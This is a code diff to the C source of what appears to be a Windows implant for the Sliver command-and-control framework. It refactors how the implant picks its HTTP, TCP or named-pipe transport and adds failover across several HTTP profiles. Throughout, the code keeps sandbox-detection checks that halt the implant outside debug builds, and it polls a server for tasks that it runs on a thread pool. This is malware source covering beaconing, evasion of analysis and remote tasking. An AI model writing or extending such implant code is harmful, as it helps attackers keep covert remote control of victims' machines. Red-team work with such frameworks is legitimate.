@@ -5,38 +5,59 @@ PSLIVER_SESSION_CLIENT SessionInit
 	_In_ PGLOBAL_CONFIG pGlobalConfig
 )
 {
-	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
+	PSLIVER_SESSION_CLIENT pSession = NULL;
 	UINT64 uReconnectDuration = 300;
 	DWORD dwPollInterval = 1.5;
 
-	pSessionClient = ALLOC(sizeof(SLIVER_BEACON_CLIENT));
-	pSessionClient->pGlobalConfig = pGlobalConfig;
-	pSessionClient->dwPollInterval = dwPollInterval;
-#ifdef _HTTP
-	pSessionClient->Init = (CLIENT_INIT)HttpInit;
-	pSessionClient->Start = HttpStart;
-	pSessionClient->Send = HttpSend;
-	pSessionClient->Receive = HttpRecv;
-	pSessionClient->Close = HttpClose;
-	pSessionClient->Cleanup = HttpCleanup;
-#elif _TCP
-	pSessionClient->Init = (CLIENT_INIT)TcpInit;
-	pSessionClient->Start = TcpStart;
-	pSessionClient->Send = TcpSend;
-	pSessionClient->Receive = TcpRecv;
-	pSessionClient->Close = TcpClose;
-	pSessionClient->Cleanup = TcpCleanup;
-#else
-	pSessionClient->Init = (CLIENT_INIT)PipeInit;
-	pSessionClient->Start = PipeStart;
-	pSessionClient->Send = PipeSend;
-	pSessionClient->Receive = PipeRecv;
-	pSessionClient->Close = PipeClose;
-	pSessionClient->Cleanup = PipeCleanup;
-#endif
+	pSession = ALLOC(sizeof(SLIVER_BEACON_CLIENT));
+	pSession->pGlobalConfig = pGlobalConfig;
+	pSession->dwPollInterval = dwPollInterval;
+	if (pGlobalConfig->Type == Session) {
+		if (pGlobalConfig->Protocol == Http) {
+			pSession->Init = (CLIENT_INIT)HttpInit;
+			pSession->Start = HttpStart;
+			pSession->Send = HttpSend;
+			pSession->Receive = HttpRecv;
+			pSession->Close = HttpClose;
+			pSession->Cleanup = HttpCleanup;
+		}
+		else {
+			FREE(pSession);
+			pSession = NULL;
+			goto CLEANUP;
+		}
+	}
+	else if (pGlobalConfig->Type == Pivot) {
+		if (pGlobalConfig->Protocol == Tcp) {
+			pSession->Init = (CLIENT_INIT)TcpInit;
+			pSession->Start = TcpStart;
+			pSession->Send = TcpSend;
+			pSession->Receive = TcpRecv;
+			pSession->Close = TcpClose;
+			pSession->Cleanup = TcpCleanup;
+		}
+		else if (pGlobalConfig->Protocol == NamedPipe) {
+			pSession->Init = (CLIENT_INIT)PipeInit;
+			pSession->Start = PipeStart;
+			pSession->Send = PipeSend;
+			pSession->Receive = PipeRecv;
+			pSession->Close = PipeClose;
+			pSession->Cleanup = PipeCleanup;
+		}
+		else {
+			FREE(pSession);
+			pSession = NULL;
+			goto CLEANUP;
+		}
+	}
+	else {
+		FREE(pSession);
+		pSession = NULL;
+		goto CLEANUP;
+	}
 
 CLEANUP:
-	return pSessionClient;
+	return pSession;
 }
 
 BOOL SessionRegister
@@ -218,68 +239,78 @@ VOID SessionMainLoop
 	PTP_WORK pWork = NULL;
 	PSESSION_WORK_WRAPPER pWrapper = NULL;
 	DWORD dwNumberOfAttempts = 0;
-
-	pSession->lpClient = pSession->Init();
-	if (pSession->lpClient == NULL) {
-		goto CLEANUP;
-	}
-
-#ifndef _DEBUG
-	if (DetectSandbox2() || DetectSandbox3()) {
-		goto CLEANUP;
-	}
-#endif
-
-	if (!pSession->Start(pSession->pGlobalConfig, pSession->lpClient)) {
-		goto CLEANUP;
-	}
-
-	if (!SessionRegister(pSession)) {
-		goto CLEANUP;
-	}
+	PGLOBAL_CONFIG pConfig = pSession->pGlobalConfig;
+	DWORD i = 0;
+	BOOL IsOk = FALSE;
+	PHTTP_PROFILE* ProfileList = NULL;
+	DWORD cProfiles = 0;
 
 	pSliverPool = InitializeSliverThreadPool();
 	if (pSliverPool == NULL) {
 		goto CLEANUP;
 	}
 
-	while (TRUE) {
+	if (pConfig->Protocol == Http) {
+		ProfileList = pConfig->HttpProfiles;
+		cProfiles = pConfig->cHttpProfiles;
+	}
+	else {
+		goto CLEANUP;
+	}
+	
+	for (i = 0; i < cProfiles; i++) {
+		pSession->lpClient = pSession->Init(ProfileList[i]);
 #ifndef _DEBUG
-		if (DetectSandbox1() || DetectSandbox2()) {
+		if (DetectSandbox2() || DetectSandbox3()) {
 			goto CLEANUP;
 		}
 #endif
-
-		if (dwNumberOfAttempts >= pSession->pGlobalConfig->dwMaxFailure) {
-			break;
+		if (!pSession->Start(pSession->pGlobalConfig, pSession->lpClient)) {
+			goto CONTINUE;
 		}
-
-		pEnvelope = pSession->Receive(pSession->pGlobalConfig, pSession->lpClient);
-		if (pEnvelope == NULL) {
-			dwNumberOfAttempts++;
-			goto SLEEP;
+			
+		if (!SessionRegister(pSession)) {
+			goto CONTINUE;
 		}
 
 		dwNumberOfAttempts = 0;
-		if (pEnvelope->uType == 0) {
-			FreeEnvelope(pEnvelope);
-			goto SLEEP;
+		while (TRUE) {
+#ifndef _DEBUG
+			if (DetectSandbox1() || DetectSandbox2()) {
+				goto CLEANUP;
+			}
+#endif
+			if (dwNumberOfAttempts >= pSession->pGlobalConfig->dwMaxFailure) {
+				goto CONTINUE;
+			}
+
+			pEnvelope = pSession->Receive(pSession->pGlobalConfig, pSession->lpClient);
+			if (pEnvelope == NULL) {
+				dwNumberOfAttempts++;
+				goto SLEEP;
+			}
+
+			dwNumberOfAttempts = 0;
+			if (pEnvelope->uType == 0) {
+				FreeEnvelope(pEnvelope);
+				goto SLEEP;
+			}
+
+			PrintFormatW(L"Receive Envelope:\n");
+			HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
+			pWrapper = ALLOC(sizeof(SESSION_WORK_WRAPPER));
+			pWrapper->pSession = pSession;
+			pWrapper->pEnvelope = pEnvelope;
+			pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)SessionWork, pWrapper, &pSliverPool->CallBackEnviron);
+			TpPostWork(pWork);
+		SLEEP:
+			Sleep(pSession->dwPollInterval * 1000);
 		}
 
-		PrintFormatW(L"Receive Envelope:\n");
-		HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
-		pWrapper = ALLOC(sizeof(SESSION_WORK_WRAPPER));
-		pWrapper->pSession = pSession;
-		pWrapper->pEnvelope = pEnvelope;
-		pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)SessionWork, pWrapper, &pSliverPool->CallBackEnviron);
-		if (pWork == NULL) {
-			LOG_ERROR("CreateThreadpoolWork", GetLastError());
-			goto CLEANUP;
-		}
-
-		TpPostWork(pWork);
-SLEEP:
-		Sleep(pSession->dwPollInterval * 1000);
+	CONTINUE:
+		pSession->Close(pSession->lpClient);
+		pSession->Cleanup(pSession->lpClient);
+		pSession->lpClient = NULL;
 	}
 
 CLEANUP:
